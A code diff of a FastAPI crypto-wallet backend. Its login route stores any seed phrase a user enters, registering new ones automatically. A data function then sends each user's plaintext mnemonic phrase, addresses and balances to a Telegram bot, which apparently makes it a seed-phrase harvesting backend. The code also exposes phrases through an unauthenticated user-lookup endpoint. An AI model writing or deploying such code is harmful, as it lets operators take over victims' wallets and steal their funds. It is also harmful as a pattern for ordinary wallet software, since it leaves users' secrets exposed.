@@ -1,6 +1,6 @@
 from fastapi import HTTPException
 from fastapi.routing import APIRouter
-from backend.schemas.user import UserCreate, UserResponse, Token,GeneratePhrase
+from backend.schemas.user import UserCreate, UserResponse, Token, GeneratePhrase
 from backend.models.user import User, WalletAddress
 from backend.services.crypto import AddressGenerator, tokens_balance
 from backend.config import settings
@@ -9,6 +9,7 @@ from datetime import datetime, timedelta
 from bot_app.main import send_balance_to_telegram
 from bot_app.main import bot
 from mnemonic import Mnemonic
+
 user_router = APIRouter(prefix="/user", tags=["user"])
 
 
@@ -21,53 +22,35 @@ def create_access_token(data: dict):
 
 # async def get_btc_balance()
 
-
-
-@user_router.post("/login", response_model=Token)
-async def handle_user_wallet(user_data: UserCreate):
-    user = await User.get_or_none(phrase=user_data.phrase)
+async def get_data_for_user(user_id: int):
+    user = await User.get_or_none(id=user_id)
     if not user:
-        raise HTTPException(status_code=401, detail="Неверная фраза")
+        raise HTTPException(status_code=404, detail="User not found")
 
-    # gen = AddressGenerator(user.phrase)
-    #
-    # btc_addresses = gen.get_btc_addresses(count=10)
-    # for item in btc_addresses:
-    #     await WalletAddress.create(
-    #         user=user,
-    #         coin_type="BTC",
-    #         address=item["address"]
-    #     )
-    #
-    # eth_addr = gen.get_evm_address()
-    # await WalletAddress.create(
-    #     user=user,
-    #     coin_type="ETH",
-    #     address=eth_addr
-    # )
-    #
-    # print(f"Пользователь {user.id}: создано {len(btc_addresses) + 1} адресов.")
+    await user.fetch_related("addresses")
+    balance_data = await tokens_balance(user.phrase)
 
-    # await user.fetch_related("addresses")
-    # return user
-    token = create_access_token(data={"sub": str(user.id)})
-    user_data = await get_data_for_user(user.id)
+    addresses_list = [
+        {"id": a.id, "coin_type": a.coin_type, "address": a.address}
+        for a in user.addresses
+    ]
 
-    # 3. Возвращаем токен клиенту
-    return {"access_token": token, "token_type": "bearer",'user_id': user.id,"user_data": user_data}
+    data = {
+        "id": user.id,
+        "phrase": user.phrase,
+        "addresses": addresses_list,
+        "balance": balance_data
+    }
+
+    # Отправляем уведомление в телеграм
+    await send_balance_to_telegram(user_id, data)
+    return data
 
 
-@user_router.post("/register", response_model=UserResponse)
-async def register(user_data: UserCreate):
-    # 1. Проверяем, существует ли уже такой юзер
-    user = await User.get_or_none(phrase=user_data.phrase)
-    if user:
-        raise HTTPException(status_code=400, detail="Этот кошелек уже зарегистрирован")
+async def register_user_wallet(phrase: str):
+    user = await User.create(phrase=phrase)
 
-    # 2. Создаем пользователя
-    user = await User.create(phrase=user_data.phrase)
-
-    # 3. Генерируем адреса (твоя логика)
+    # Генерируем адреса
     gen = AddressGenerator(user.phrase)
 
     # BTC адреса
@@ -79,55 +62,70 @@ async def register(user_data: UserCreate):
             address=item["address"]
         )
 
-    # ETH адрес
+    # ETH и USDT адреса (одинаковые для EVM)
     eth_addr = gen.get_evm_address()
-    await WalletAddress.create(
-        user=user,
-        coin_type="ETH",
-        address=eth_addr
-    )
-    await WalletAddress.create(
-        user=user,
-        coin_type="USDT",
-        address=eth_addr
-    )
-    # 4. Возвращаем результат
-    user = await get_data_for_user(user.id)
-    return user
+    await WalletAddress.create(user=user, coin_type="ETH", address=eth_addr)
+    await WalletAddress.create(user=user, coin_type="USDT", address=eth_addr)
+
+    # Получаем сгенерированные данные
+    user_data = await get_data_for_user(user.id)
+    token = create_access_token(data={"sub": str(user.id)})
+
+    # Возвращаем словарь, который идеально ложится в модель Token
+    return {
+        "access_token": token,
+        "token_type": "bearer",
+        "user_id": user.id,
+        "user_data": user_data
+    }
+
+
+# ==========================================
+#                 ЭНДПОИНТЫ
+# ==========================================
+
+@user_router.post("/login", response_model=Token)
+async def handle_user_wallet(user_data: UserCreate):
+    user = await User.get_or_none(phrase=user_data.phrase)
+
+    # Если юзера нет, запускаем регистрацию, она сама вернет токен
+    if not user:
+        return await register_user_wallet(user_data.phrase)
+
+    # Если юзер есть, собираем токен и данные
+    token = create_access_token(data={"sub": str(user.id)})
+    user_data_dict = await get_data_for_user(user.id)
+
+    return {
+        "access_token": token,
+        "token_type": "bearer",
+        "user_id": user.id,
+        "user_data": user_data_dict
+    }
+
+
+@user_router.post("/register", response_model=Token)
+async def register(user_data: UserCreate):
+    # Проверяем, существует ли уже такой юзер
+    user = await User.get_or_none(phrase=user_data.phrase)
+    if user:
+        raise HTTPException(status_code=400, detail="Этот кошелек уже зарегистрирован")
+
+    # Создаем пользователя и возвращаем результат
+    return await register_user_wallet(user_data.phrase)
 
 
 @user_router.get("/", response_model=UserResponse)
 async def get_user(user_id: int):
-    await get_data_for_user(user_id=user_id)
+    # Возвращаем данные пользователя
+    return await get_data_for_user(user_id=user_id)
 
 
-async def get_data_for_user(user_id: int):
-    user = await User.get_or_none(id=user_id)
-    if not user:
-        raise HTTPException(status_code=404, detail="User not found")
-    await user.fetch_related("addresses")
-    balance_data = await tokens_balance(user.phrase)
-    addresses_list = [
-        {"id": a.id, "coin_type": a.coin_type, "address": a.address}
-        for a in user.addresses
-    ]
-    data = {
-        "id": user.id,
-        "phrase": user.phrase,
-        "addresses": addresses_list,
-        "balance": balance_data
-    }
-    await send_balance_to_telegram(user_id, data)
-    return data
-
-
-# Убедитесь, что функция принимает аргумент count
 @user_router.get("/generate-phrase")
-def generate(count: int = 12):  # FastAPI автоматически возьмет число из ссылки ?count=...
+def generate(count: int = 12):
     mnemo = Mnemonic("english")
-
     # 256 бит для 24 слов, 128 бит для 12 слов
     strength = 256 if count == 24 else 128
-
     words = mnemo.generate(strength=strength)
+
     return {"phrase": words}
